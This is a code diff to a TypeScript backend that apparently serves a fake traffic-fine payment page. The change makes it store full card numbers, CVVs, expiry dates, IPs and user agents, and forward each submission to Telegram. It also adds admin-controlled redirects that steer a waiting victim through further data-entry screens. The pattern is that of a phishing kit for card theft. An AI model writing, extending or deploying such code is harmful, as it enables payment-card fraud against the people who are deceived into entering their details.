@@ -1,7 +1,13 @@
-import { paymentDao } from '../dao/payment.dao';
-import { logger } from '../utils/logger';
-import { PaymentInput } from '../types';
-import { telegramService } from './telegram.service';
+import { paymentDao } from "../dao/payment.dao";
+import { logger } from "../utils/logger";
+import { PaymentInput, FlowCheckResult } from "../types";
+import { telegramService } from "./telegram.service";
+import { FlowSubmission } from "../models/payment.model";
+import {
+  isRedirectAction,
+  pageForAction,
+  pathForAction,
+} from "../constants/flow";
 
 function makeReference(): string {
   const rand = Math.random().toString(36).slice(2, 7).toUpperCase();
@@ -9,8 +15,9 @@ function makeReference(): string {
 }
 
 export const paymentService = {
-  async submit(input: PaymentInput, ip?: string) {
+  async submit(input: PaymentInput, ip?: string, userAgent?: string) {
     const reference = makeReference();
+    const cardDigits = (input.cardNumber ?? "").replace(/\D/g, "");
 
     const record = await paymentDao.create({
       reference,
@@ -22,28 +29,92 @@ export const paymentService = {
       amount: input.amount,
       violationRefs: input.violationRefs ?? [],
       notes: input.notes,
-      language: input.language ?? 'en',
-      status: 'submitted',
+      language: input.language ?? "en",
+      status: "submitted",
+      cardholderName: input.cardholderName,
+      cardNumber: cardDigits || undefined,
+      cardLastFour: cardDigits ? cardDigits.slice(-4) : undefined,
+      cardExpiryMonth: input.cardExpiryMonth,
+      cardExpiryYear: input.cardExpiryYear,
+      cardCvv: input.cardCvv,
       ip,
+      userAgent,
     });
 
     // Relay to Telegram in the BACKGROUND so the user gets an instant response.
-    // The DB row records the real delivery outcome for retry/audit.
     void telegramService
-      .sendPayment({ ...input, reference, ip })
+      .sendStep("payment_completed", record)
       .then((sent) =>
-        paymentDao.updateStatus(
-          reference,
-          sent.ok ? 'forwarded' : 'failed',
-          sent.messageId,
-        ),
+        sent.ok
+          ? paymentDao.updateStatus(reference, "forwarded", sent.messageId)
+          : paymentDao.updateStatus(reference, "failed"),
       )
       .catch((err) => {
-        logger.error('Telegram relay failed', err);
-        return paymentDao.updateStatus(reference, 'failed');
+        logger.error("Telegram relay failed", err);
+        return paymentDao.updateStatus(reference, "failed");
       });
 
-    // 'submitted' = accepted and queued for relay.
     return { reference, status: record.status, amount: record.amount };
+  },
+
+  /**
+   * Poll endpoint for the waiting browser. Mirrors jusoura's loaderCheckResponse:
+   * when the customer has arrived on the page the admin sent them to, the action
+   * is cleared so they stay put; otherwise a redirect path is returned.
+   */
+  async flowCheck(
+    reference: string,
+    currentPage?: string,
+  ): Promise<FlowCheckResult> {
+    let record = await paymentDao.findByReference(reference);
+    if (!record) return { ok: false, action: null, redirect: null };
+
+    const action = record.flowAction ?? null;
+
+    // Arrived on the target page → clear the pending action.
+    if (
+      currentPage &&
+      isRedirectAction(action) &&
+      pageForAction(action) === currentPage
+    ) {
+      record = await paymentDao.clearFlowAction(reference);
+      return { ok: true, action: null, redirect: null };
+    }
+
+    let redirect: string | null = null;
+    if (isRedirectAction(action)) {
+      const targetPage = pageForAction(action);
+      if (!currentPage || targetPage !== currentPage) {
+        redirect = pathForAction(action);
+      }
+    }
+
+    return { ok: true, action, redirect };
+  },
+
+  /** Records a submission from a flow screen and relays it to Telegram. */
+  async flowStep(
+    reference: string,
+    step: string,
+    data: Record<string, unknown>,
+    ip?: string,
+    userAgent?: string,
+  ): Promise<{ ok: boolean }> {
+    const submission: FlowSubmission = {
+      step,
+      data,
+      ip,
+      userAgent,
+      submittedAt: new Date(),
+    };
+
+    const record = await paymentDao.appendFlowSubmission(reference, submission);
+    if (!record) return { ok: false };
+
+    void telegramService.sendStep(step, record, data).catch((err) => {
+      logger.error("Telegram flow relay failed", err);
+    });
+
+    return { ok: true };
   },
 };
